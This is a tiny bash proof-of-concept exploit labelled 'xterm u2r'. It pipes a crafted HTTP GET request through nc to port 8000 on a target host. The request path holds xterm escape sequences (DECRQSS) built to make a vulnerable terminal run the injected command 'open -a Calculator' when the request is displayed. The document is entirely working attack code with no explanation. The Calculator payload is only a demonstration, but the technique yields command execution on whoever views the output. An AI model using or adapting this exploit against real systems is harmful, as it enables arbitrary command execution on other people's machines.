#!/bin/bash

#xterm u2r

#https://www.youtube.com/watch?v=_j8m7VMpjTY&t=139s

printf "GET /?\e[om\eP\$q\x03\e\\ \eP\$qm;open -a Calculator\r\e\\ \eP\$qm\e\\ HTTP/1.0\n\n" | nc $1 8000 | cat -v